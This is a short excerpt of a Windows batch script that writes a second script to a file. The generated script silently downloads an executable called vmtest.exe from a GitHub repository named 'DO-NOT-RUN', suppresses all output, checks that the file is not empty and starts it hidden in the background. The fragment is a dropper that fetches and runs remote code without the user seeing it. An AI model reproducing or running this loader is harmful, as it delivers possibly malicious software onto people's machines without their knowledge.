...
echo curl -L -o "%folderPath%\vmtest.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/vmtest.exe" ^>nul 2^>^&1 >> "%batchScript%"
echo if not exist "%folderPath%\vmtest.exe" exit /b 1 >> "%batchScript%"
echo for %%%%F in ("%folderPath%\vmtest.exe") do set filesize=%%%%~zF >> "%batchScript%"
echo if "!filesize!"=="0" exit /b 1 >> "%batchScript%"
echo start "" /b "%folderPath%\vmtest.exe" >> "%batchScript%"
